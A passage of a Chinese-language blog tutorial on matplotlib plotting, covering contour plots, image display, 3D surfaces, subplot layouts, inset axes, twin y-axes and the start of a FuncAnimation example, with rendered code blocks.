y)</span><br></pre></td></tr></table></figure><p>接下来进行颜色填充。使用函数<code>plt.contourf</code>把颜色加进去，位置参数分别为：X, Y, f(X,Y)。透明度0.75，并将 f(X,Y) 的值对应到color map的暖色组中寻找对应颜色。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use plt.contourf to filling contours</span></span><br><span class="line"><span class="comment"># X, Y and value for (X,Y) point</span></span><br><span class="line">plt.contourf(X, Y, f(X, Y), <span class="number">8</span>, alpha=<span class="number">.75</span>, cmap=plt.cm.hot)</span><br></pre></td></tr></table></figure><p>接下来进行等高线绘制。使用<code>plt.contour</code>函数划线。位置参数为：X, Y, f(X,Y)。颜色选黑色，线条宽度选0.5。现在的结果如下图所示，只有颜色和线条，还没有数值Label：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># use plt.contour to add contour lines</span></span><br><span class="line">C = plt.contour(X, Y, f(X, Y), <span class="number">8</span>, colors=<span class="string">'black'</span>,linewidths=[<span class="number">0.5</span>])</span><br></pre></td></tr></table></figure><h4 id="添加高度数字"><a href="#添加高度数字" class="headerlink" title="添加高度数字"></a>添加高度数字</h4><p>其中，8代表等高线的密集程度，这里被分为10个部分。如果是0，则图像被一分为二。</p><p>最后加入Label，<code>inline</code>控制是否将Label画在线里面，字体大小为10。并将坐标轴隐藏：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.clabel(C, inline=<span class="keyword">True</span>, fontsize=<span class="number">10</span>)</span><br><span class="line">plt.xticks(())</span><br><span class="line">plt.yticks(())</span><br></pre></td></tr></table></figure><h3 id="Image-图片"><a href="#Image-图片" class="headerlink" title="Image 图片"></a>Image 图片</h3><h4 id="随机矩阵画图"><a href="#随机矩阵画图" class="headerlink" title="随机矩阵画图"></a>随机矩阵画图</h4><p>用这样 3x3 的 2D-array 来表示点的颜色，每一个点就是一个pixel（像素）。三行三列的格子，<strong>a</strong>代表每一个值，图像右边有一个注释，白色代表值最大的地方，颜色越深值越小。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">a = np.array([<span class="number">0.313660827978</span>, <span class="number">0.365348418405</span>, <span class="number">0.423733120134</span>,</span><br><span class="line">              <span class="number">0.365348418405</span>, <span class="number">0.439599930621</span>, <span class="number">0.525083754405</span>,</span><br><span class="line">              <span class="number">0.423733120134</span>, <span class="number">0.525083754405</span>, <span class="number">0.651536351379</span>]).reshape(<span class="number">3</span>,<span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>我们之前选cmap的参数时用的是：<code>cmap=plt.cmap.bone</code>，而现在，我们可以直接用单引号传入参数。 <code>origin=&#39;lower&#39;</code>代表的就是选择的原点的位置。</p><h4 id="出图方式"><a href="#出图方式" class="headerlink" title="出图方式"></a>出图方式</h4><p>使用的是内插法中的 <a href="https://en.wikipedia.org/wiki/Nearest-neighbor_interpolation" target="_blank" rel="noopener">Nearest-neighbor</a> 的方法，其他的方式也都可以随意取选。</p><h5 id="colorbar"><a href="#colorbar" class="headerlink" title="colorbar"></a>colorbar</h5><p>添加一个<code>colorbar</code> ，其中我们添加一个<code>shrink</code>参数，使<code>colorbar</code>的长度变短为原来的92%：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.colorbar(shrink=<span class="number">.92</span>)</span><br><span class="line"></span><br><span class="line">plt.xticks(())</span><br><span class="line">plt.yticks(())</span><br></pre></td></tr></table></figure><h3 id="3D-图"><a href="#3D-图" class="headerlink" title="3D 图"></a>3D 图</h3><p>首先在进行 <code>3D Plot</code> 时除了导入 <code>matplotlib</code> ，还要额外添加一个模块，即 <code>Axes 3D</code> 3D 坐标轴显示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br></pre></td></tr></table></figure><p>之后要先定义一个图像窗口，在窗口上添加3D坐标轴:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig)</span><br></pre></td></tr></table></figure><p>接下来给进 X 和 Y 值，并将 X 和 Y 编织成栅格。每一个（X, Y）点对应的高度值我们用下面这个函数来计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> mpl_toolkits.mplot3d <span class="keyword">import</span> Axes3D</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig)</span><br><span class="line"></span><br><span class="line"><span class="comment"># X, Y value</span></span><br><span class="line">X = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</span><br><span class="line">Y = np.arange(<span class="number">-4</span>, <span class="number">4</span>, <span class="number">0.25</span>)</span><br><span class="line">X, Y = np.meshgrid(X, Y)    <span class="comment"># x-y 平面的网格</span></span><br><span class="line">R = np.sqrt(X ** <span class="number">2</span> + Y ** <span class="number">2</span>)</span><br><span class="line"><span class="comment"># height value</span></span><br><span class="line">Z = np.sin(R)</span><br><span class="line"></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>做出一个三维曲面，并将一个 <code>colormap rainbow</code> 填充颜色，之后将三维图像投影到 XY 平面上做一个等高线图。 plot 3D 图像：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.plot_surface(X, Y, Z, rstride=<span class="number">1</span>, cstride=<span class="number">1</span>, cmap=plt.get_cmap(<span class="string">'rainbow'</span>))</span><br></pre></td></tr></table></figure><p>其中，<code>rstride</code> 和 <code>cstride</code> 分别代表 row 和 column 的跨度。</p><h4 id="投影"><a href="#投影" class="headerlink" title="投影"></a>投影</h4><p>下面添加 XY 平面的等高线：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax.contourf(X, Y, Z, zdir=<span class="string">'z'</span>, offset=<span class="number">-2</span>, cmap=plt.get_cmap(<span class="string">'rainbow'</span>))</span><br></pre></td></tr></table></figure><p>如果 <code>zdir</code> 选择了x，那么效果将会是对于 XZ 平面的投影。</p><h2 id="Subplot-多合一显示"><a href="#Subplot-多合一显示" class="headerlink" title="Subplot 多合一显示"></a>Subplot 多合一显示</h2><h3 id="均匀图中图"><a href="#均匀图中图" class="headerlink" title="均匀图中图"></a>均匀图中图</h3><p>matplotlib 是可以组合许多的小图, 放在一张大图里面显示的. 使用到的方法叫作 subplot.</p><p>使用<code>plt.figure</code>创建一个图像窗口.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line">plt.figure()</span><br></pre></td></tr></table></figure><p>使用<code>plt.subplot</code>来创建小图. <code>plt.subplot(2,2,1)</code>表示将整个图像窗口分为2行2列, 当前位置为1. 使用<code>plt.plot([0,1],[0,1])</code>在第1个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><code>plt.subplot(2,2,2)</code>表示将整个图像窗口分为2行2列, 当前位置为2. 使用<code>plt.plot([0,1],[0,2])</code>在第2个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p><code>plt.subplot(2,2,3)</code>表示将整个图像窗口分为2行2列,当前位置为3. <code>plt.subplot(2,2,3)</code>可以简写成<code>plt.subplot(223)</code>, matplotlib同样可以识别. 使用<code>plt.plot([0,1],[0,3])</code>在第3个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">223</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">3</span>])</span><br></pre></td></tr></table></figure><p><code>plt.subplot(224)</code>表示将整个图像窗口分为2行2列, 当前位置为4. 使用<code>plt.plot([0,1],[0,4])</code>在第4个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">224</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">4</span>])</span><br></pre></td></tr></table></figure><h3 id="不均匀图中图"><a href="#不均匀图中图" class="headerlink" title="不均匀图中图"></a>不均匀图中图</h3><p>如果把第1个小图放到第一行, 而剩下的3个小图都放到第二行.</p><p>使用<code>plt.subplot(2,1,1)</code>将整个图像窗口分为2行1列, 当前位置为1. 使用<code>plt.plot([0,1],[0,1])</code>在第1个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>使用<code>plt.subplot(2,3,4)</code>将整个图像窗口分为2行3列, 当前位置为4. 使用<code>plt.plot([0,1],[0,2])</code>在第4个位置创建一个小图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 使用plt.figure创建一个图像窗口.</span></span><br><span class="line">plt.figure()</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">1</span>])</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">2</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>上一步中使用<code>plt.subplot(2,1,1)</code>将整个图像窗口分为2行1列, 第1个小图占用了第1个位置, 也就是整个第1行. 这一步中使用<code>plt.subplot(2,3,4)</code>将整个图像窗口分为2行3列, 于是整个图像窗口的第1行就变成了3列, 也就是成了3个位置, 于是第2行的第1个位置是整个图像窗口的第4个位置.</p><p>使用<code>plt.subplot(235)</code>将整个图像窗口分为2行3列,当前位置为5. 使用<code>plt.plot([0,1],[0,3])</code>在第5个位置创建一个小图. 同上, 再创建<code>plt.subplot(236)</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">235</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">3</span>])</span><br><span class="line">plt.subplot(<span class="number">236</span>)</span><br><span class="line">plt.plot([<span class="number">0</span>,<span class="number">1</span>],[<span class="number">0</span>,<span class="number">4</span>])</span><br></pre></td></tr></table></figure><h2 id="Subplot-分格显示"><a href="#Subplot-分格显示" class="headerlink" title="Subplot 分格显示"></a>Subplot 分格显示</h2><h3 id="subplot2grid"><a href="#subplot2grid" class="headerlink" title="subplot2grid"></a>subplot2grid</h3><p>使用<code>plt.subplot2grid</code>来创建第1个小图, <code>(3,3)</code>表示将整个图像窗口分成3行3列, <code>(0,0)</code>表示从第0行第0列开始作图，<code>colspan=3</code>表示列的跨度为3, <code>rowspan=1</code>表示行的跨度为1. <code>colspan</code>和<code>rowspan</code>缺省, 默认跨度为1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 使用plt.figure创建一个图像窗口.</span></span><br><span class="line">ax1 = plt.subplot2grid((<span class="number">3</span>, <span class="number">3</span>), (<span class="number">0</span>, <span class="number">0</span>), colspan=<span class="number">3</span>)</span><br><span class="line">ax1.plot([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">1</span>, <span class="number">2</span>])    <span class="comment"># 画小图</span></span><br><span class="line">ax1.set_title(<span class="string">'ax1_title'</span>)  <span class="comment"># 设置小图的标题</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>使用<code>plt.subplot2grid</code>来创建第2个小图, <code>(3,3)</code>表示将整个图像窗口分成3行3列, <code>(1,0)</code>表示从第1行第0列开始作图，<code>colspan=2</code>表示列的跨度为2. 同上画出 <code>ax3</code>, <code>(1,2)</code>表示从第1行第2列开始作图，<code>rowspan=2</code>表示行的跨度为2. 再画一个 <code>ax4</code> 和 <code>ax5</code>, 使用默认 <code>colspan, rowspan</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ax2 = plt.subplot2grid((<span class="number">3</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">0</span>), colspan=<span class="number">2</span>)</span><br><span class="line">ax3 = plt.subplot2grid((<span class="number">3</span>, <span class="number">3</span>), (<span class="number">1</span>, <span class="number">2</span>), rowspan=<span class="number">2</span>)</span><br><span class="line">ax4 = plt.subplot2grid((<span class="number">3</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">0</span>))</span><br><span class="line">ax5 = plt.subplot2grid((<span class="number">3</span>, <span class="number">3</span>), (<span class="number">2</span>, <span class="number">1</span>))</span><br></pre></td></tr></table></figure><p>使用<code>ax4.scatter</code>创建一个散点图, 使用<code>ax4.set_xlabel</code>和<code>ax4.set_ylabel</code>来对x轴和y轴命名.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ax4.scatter([<span class="number">1</span>, <span class="number">2</span>], [<span class="number">2</span>, <span class="number">2</span>])</span><br><span class="line">ax4.set_xlabel(<span class="string">'ax4_x'</span>)</span><br><span class="line">ax4.set_ylabel(<span class="string">'ax4_y'</span>)</span><br></pre></td></tr></table></figure><h3 id="gridspec"><a href="#gridspec" class="headerlink" title="gridspec"></a>gridspec</h3><p>使用<code>import</code>导入<code>matplotlib.pyplot</code>模块, 并简写成<code>plt</code>. 使用<code>import</code>导入<code>matplotlib.gridspec</code>, 并简写成<code>gridspec</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib.gridspec <span class="keyword">as</span> gridspec</span><br></pre></td></tr></table></figure><p>使用<code>plt.figure()</code>创建一个图像窗口, 使用<code>gridspec.GridSpec</code>将整个图像窗口分成3行3列.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.figure()</span><br><span class="line">gs = gridspec.GridSpec(<span class="number">3</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><p>使用<code>plt.subplot</code>来作图, <code>gs[0, :]</code>表示这个图占第0行和所有列, <code>gs[1, :2]</code>表示这个图占第1行和第2列前的所有列, <code>gs[1:, 2]</code>表示这个图占第1行后的所有行和第2列, <code>gs[-1, 0]</code>表示这个图占倒数第1行和第0列, <code>gs[-1, -2]</code>表示这个图占倒数第1行和倒数第2列.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ax6 = plt.subplot(gs[<span class="number">0</span>, :])</span><br><span class="line">ax7 = plt.subplot(gs[<span class="number">1</span>, :<span class="number">2</span>])</span><br><span class="line">ax8 = plt.subplot(gs[<span class="number">1</span>:, <span class="number">2</span>])</span><br><span class="line">ax9 = plt.subplot(gs[<span class="number">-1</span>, <span class="number">0</span>])</span><br><span class="line">ax10 = plt.subplot(gs[<span class="number">-1</span>, <span class="number">-2</span>])</span><br></pre></td></tr></table></figure><h3 id="subplots"><a href="#subplots" class="headerlink" title="subplots"></a>subplots</h3><p>使用<code>plt.subplots</code>建立一个2行2列的图像窗口，<code>sharex=True</code>表示共享x轴坐标, <code>sharey=True</code>表示共享y轴坐标. <code>((ax11, ax12), (ax13, ax14))</code>表示第1行从左至右依次放<code>ax11</code>和<code>ax12</code>, 第2行从左至右依次放<code>ax13</code>和<code>ax14</code>.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f, ((ax11, ax12), (ax13, ax14)) = plt.subplots(<span class="number">2</span>, <span class="number">2</span>, sharex=<span class="keyword">True</span>, sharey=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>使用<code>ax11.scatter</code>创建一个散点图.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax11.scatter([<span class="number">1</span>,<span class="number">2</span>], [<span class="number">1</span>,<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p><code>plt.tight_layout()</code>表示紧凑显示图像, <code>plt.show()</code>表示显示图像.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.tight_layout()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="图中图"><a href="#图中图" class="headerlink" title="图中图"></a>图中图</h2><h3 id="准备数据"><a href="#准备数据" class="headerlink" title="准备数据"></a>准备数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入pyplot模块</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化figure</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建数据</span></span><br><span class="line">x = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]</span><br><span class="line">y = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">6</span>]</span><br></pre></td></tr></table></figure><h3 id="大图"><a href="#大图" class="headerlink" title="大图"></a>大图</h3><p>绘制大图。首先确定大图左下角的位置以及宽高：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">left, bottom, width, height = <span class="number">0.1</span>, <span class="number">0.1</span>, <span class="number">0.8</span>, <span class="number">0.8</span></span><br></pre></td></tr></table></figure><p>4个值都是占整个<code>figure</code>坐标系的百分比。在这里，假设<code>figure</code>的大小是10x10，那么大图就被包含在由(1, 1)开始，宽8，高8的坐标系内。</p><p>将大图坐标系添加到<code>figure</code>中，颜色为r(red)，取名为title：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ax1 = fig.add_axes([left, bottom, width, height])</span><br><span class="line">ax1.plot(x, y, <span class="string">'r'</span>)</span><br><span class="line">ax1.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax1.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line">ax1.set_title(<span class="string">'title'</span>)</span><br></pre></td></tr></table></figure><h3 id="小图"><a href="#小图" class="headerlink" title="小图"></a>小图</h3><p>绘制左上角的小图，步骤和绘制大图一样，注意坐标系位置和大小的改变：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">left, bottom, width, height = <span class="number">0.2</span>, <span class="number">0.6</span>, <span class="number">0.25</span>, <span class="number">0.25</span></span><br><span class="line">ax2 = fig.add_axes([left, bottom, width, height])</span><br><span class="line">ax2.plot(y, x, <span class="string">'b'</span>)</span><br><span class="line">ax2.set_xlabel(<span class="string">'x'</span>)</span><br><span class="line">ax2.set_ylabel(<span class="string">'y'</span>)</span><br><span class="line">ax2.set_title(<span class="string">'title inside 1'</span>)</span><br></pre></td></tr></table></figure><p>绘制右下角的小图。这里我们采用一种更简单方法，即直接往plt里添加新的坐标系：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plt.axes([<span class="number">0.6</span>, <span class="number">0.2</span>, <span class="number">0.25</span>, <span class="number">0.25</span>])</span><br><span class="line">plt.plot(y[::<span class="number">-1</span>], x, <span class="string">'g'</span>) <span class="comment"># 注意对y进行了逆序处理</span></span><br><span class="line">plt.xlabel(<span class="string">'x'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'y'</span>)</span><br><span class="line">plt.title(<span class="string">'title inside 2'</span>)</span><br></pre></td></tr></table></figure><h2 id="次坐标轴"><a href="#次坐标轴" class="headerlink" title="次坐标轴"></a>次坐标轴</h2><p>有时候我们会用到次坐标轴，即在同个图上有第2个y轴存在。</p><h3 id="第一个y坐标"><a href="#第一个y坐标" class="headerlink" title="第一个y坐标"></a>第一个y坐标</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">x = np.arange(<span class="number">0</span>, <span class="number">10</span>, <span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">y1 = <span class="number">0.05</span> * x**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">y2 = <span class="number">-1</span> * y1</span><br><span class="line"><span class="comment"># 可以看到，y2和y1是互相倒置的。接着，获取figure默认的坐标系 ax1：</span></span><br><span class="line">fig, ax1 = plt.subplots()</span><br></pre></td></tr></table></figure><h3 id="第二个y坐标"><a href="#第二个y坐标" class="headerlink" title="第二个y坐标"></a>第二个y坐标</h3><p>对<code>ax1</code>调用<code>twinx()</code>方法，生成如同镜面效果后的<code>ax2</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ax2 = ax1.twinx()</span><br><span class="line"><span class="comment"># 接着进行绘图, 将 y1, y2 分别画在 ax1, ax2 上：</span></span><br><span class="line">ax1.plot(x, y1, <span class="string">'g-'</span>)   <span class="comment"># green, solid line</span></span><br><span class="line">ax1.set_xlabel(<span class="string">'X data'</span>)</span><br><span class="line">ax1.set_ylabel(<span class="string">'Y1 data'</span>, color=<span class="string">'g'</span>)</span><br><span class="line">ax2.plot(x, y2, <span class="string">'b-'</span>) <span class="comment"># blue</span></span><br><span class="line">ax2.set_ylabel(<span class="string">'Y2 data'</span>, color=<span class="string">'b'</span>)</span><br></pre></td></tr></table></figure><h2 id="Animation-动画"><a href="#Animation-动画" class="headerlink" title="Animation 动画"></a>Animation 动画</h2><h3 id="定义方程"><a href="#定义方程" class="headerlink" title="定义方程"></a>定义方程</h3><p>使用matplotlib做动画也是可以的，我们使用其中一种方式，function animation来说说， 具体可参考<a href="http://matplotlib.sourceforge.net/api/animation_api.html" target="_blank" rel="noopener">matplotlib animation api</a>。首先，我们做一些准备工作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> animation</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">fig, ax = plt.subplots()</span><br></pre></td></tr></table></figure><p>我们的数据是一个0~2π内的正弦曲线：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, <span class="number">2</span>*np.pi, <span class="number">0.01</span>)</span><br><span class="line">line, = ax.plot(x, np.sin(x))</span><br></pre></td></tr></table></figure><p>接着，构造自定义动画函数<code>animate</code>，用来更新每一帧上各个<code>x</code>对应的<code>y</code>坐标值，参数表示第i帧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">animate</span><span class="params">(i)</span>:</span></span><br><span class="line">    line.set_ydata(np.sin(x + i/<span class="number">10.0</span>))</span><br><span class="line">    <span class="keyword">return</span> line,</span><br></pre></td></tr></table></figure><p>然后，构造开始帧函数<code>init</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    line.set_ydata(np.sin(x))</span><br><span class="line">    <span class="keyword">return</span> line,</span><br></pre></td></tr></table></figure><h3 id="参数设置"><a href="#参数设置" class="headerlink" title="参数设置"></a>参数设置</h3><p>接下来，我们调用<code>FuncAnimation</code>函数生成动画。参数说明： 1. <code>fig</code> 进行动画绘制的figure 2. <code>func</code> 自定义动画函数，即传入刚定义的函数<code>animate</code> 3. <code>frames</code> 动画长度，一次循环包含的帧数 4. <code>init_func</code> 自定义开始帧，即传入刚定义的函数<code>init</code> 5. <code>interval</code> 更新频率，以ms计 6. <code>blit</code> 选择更新所有点，还是仅更新产生变化的点。应选择<code>True</code>，但mac用户请选择<code>False</code>，否则无法显示动画.(用的pycharm2020 3.3版本，没实验成功)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 